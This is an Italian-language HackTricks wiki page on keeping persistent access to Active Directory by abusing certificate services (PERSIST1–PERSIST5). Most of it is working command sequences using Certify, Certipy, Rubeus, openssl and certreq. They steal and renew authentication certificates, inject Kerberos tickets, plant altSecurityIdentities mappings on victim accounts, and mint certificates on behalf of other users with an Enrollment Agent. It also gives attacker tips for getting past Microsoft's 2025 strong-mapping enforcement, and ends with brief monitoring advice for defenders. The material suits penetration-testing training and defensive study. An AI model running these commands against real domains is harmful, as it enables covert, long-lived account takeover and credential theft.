# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Questo è un piccolo riassunto dei capitoli sulla persistenza degli account della fantastica ricerca di [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendere il Furto delle Credenziali Utente Attive con i Certificati – PERSIST1

In uno scenario in cui un certificato che consente l'autenticazione del dominio può essere richiesto da un utente, un attaccante ha l'opportunità di richiedere e rubare questo certificato per mantenere la persistenza su una rete. Per impostazione predefinita, il modello `User` in Active Directory consente tali richieste, anche se a volte può essere disabilitato.

Utilizzando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puoi cercare modelli abilitati che consentono l'autenticazione del client e poi richiederne uno:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Il potere di un certificato risiede nella sua capacità di autenticarsi come l'utente a cui appartiene, indipendentemente dalle modifiche della password, purché il certificato rimanga valido.

Puoi convertire PEM in PFX e usarlo per ottenere un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinato con altre tecniche (vedi le sezioni THEFT), l'autenticazione basata su certificati consente un accesso persistente senza toccare LSASS e anche da contesti non elevati.

## Ottenere Persistenza della Macchina con Certificati - PERSIST2

Se un attaccante ha privilegi elevati su un host, può registrare l'account macchina del sistema compromesso per un certificato utilizzando il modello predefinito `Machine`. Autenticarsi come macchina abilita S4U2Self per i servizi locali e può fornire una persistenza duratura dell'host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estensione della Persistenza Tramite Rinnovo del Certificato - PERSIST3

Abusare dei periodi di validità e rinnovo dei modelli di certificato consente a un attaccante di mantenere l'accesso a lungo termine. Se possiedi un certificato precedentemente emesso e la sua chiave privata, puoi rinnovarlo prima della scadenza per ottenere una nuova credenziale a lungo termine senza lasciare ulteriori artefatti di richiesta legati al principale originale.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Suggerimento operativo: Tieni traccia delle scadenze sui file PFX detenuti dagli attaccanti e rinnova in anticipo. Il rinnovo può anche causare l'inclusione dell'estensione di mapping SID moderna nei certificati aggiornati, mantenendoli utilizzabili sotto regole di mapping DC più rigorose (vedi la sezione successiva).

## Piantare Mappature di Certificati Espliciti (altSecurityIdentities) – PERSIST4

Se puoi scrivere nell'attributo `altSecurityIdentities` di un account target, puoi mappare esplicitamente un certificato controllato dall'attaccante a quell'account. Questo persiste attraverso le modifiche della password e, quando si utilizzano formati di mapping forti, rimane funzionale sotto l'applicazione moderna del DC.

Flusso ad alto livello:

1. Ottieni o emetti un certificato di autenticazione client che controlli (ad es., iscriviti al modello `User` come te stesso).
2. Estrai un identificatore forte dal certificato (Issuer+Serial, SKI o SHA1-PublicKey).
3. Aggiungi una mappatura esplicita sull'`altSecurityIdentities` del principale vittima utilizzando quell'identificatore.
4. Autenticati con il tuo certificato; il DC lo mappa alla vittima tramite la mappatura esplicita.

Esempio (PowerShell) utilizzando una mappatura forte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Quindi autentica con il tuo PFX. Certipy otterrà un TGT direttamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Note
- Utilizzare solo tipi di mapping forti: X509IssuerSerialNumber, X509SKI o X509SHA1PublicKey. I formati deboli (Subject/Issuer, solo Subject, email RFC822) sono deprecati e possono essere bloccati dalla policy DC.
- La catena di certificati deve costruirsi su un root fidato dal DC. Le CA aziendali in NTAuth sono tipicamente fidate; alcuni ambienti fidano anche le CA pubbliche.

Per ulteriori informazioni sui mapping espliciti deboli e sui percorsi di attacco, vedere:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent come Persistenza – PERSIST5

Se ottieni un certificato valido di Certificate Request Agent/Enrollment Agent, puoi coniare nuovi certificati abilitati al login per conto degli utenti a piacimento e mantenere l'agente PFX offline come token di persistenza. Workflow di abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revocare il certificato dell'agente o le autorizzazioni del modello è necessario per espellere questa persistenza.

## 2025 Enforcement della Mappatura dei Certificati Forti: Impatto sulla Persistenza

Microsoft KB5014754 ha introdotto l'Enforcement della Mappatura dei Certificati Forti sui controller di dominio. Dal 11 febbraio 2025, i DC predefiniscono l'Enforcement Completo, rifiutando mappature deboli/ambigue. Implicazioni pratiche:

- I certificati pre-2022 che mancano dell'estensione di mappatura SID potrebbero fallire nella mappatura implicita quando i DC sono in Enforcement Completo. Gli attaccanti possono mantenere l'accesso rinnovando i certificati tramite AD CS (per ottenere l'estensione SID) o piantando una mappatura esplicita forte in `altSecurityIdentities` (PERSIST4).
- Le mappature esplicite che utilizzano formati forti (Issuer+Serial, SKI, SHA1-PublicKey) continuano a funzionare. I formati deboli (Issuer/Subject, Subject-only, RFC822) possono essere bloccati e dovrebbero essere evitati per la persistenza.

Gli amministratori dovrebbero monitorare e allertare su:
- Modifiche a `altSecurityIdentities` e emissione/rinnovi di certificati per Agenti di Registrazione e Utenti.
- Log di emissione della CA per richieste per conto di terzi e schemi di rinnovo insoliti.

## Riferimenti

- Microsoft. KB5014754: Modifiche all'autenticazione basata su certificati sui controller di dominio Windows (cronologia dell'enforcement e mappature forti).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Riferimento ai Comandi (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
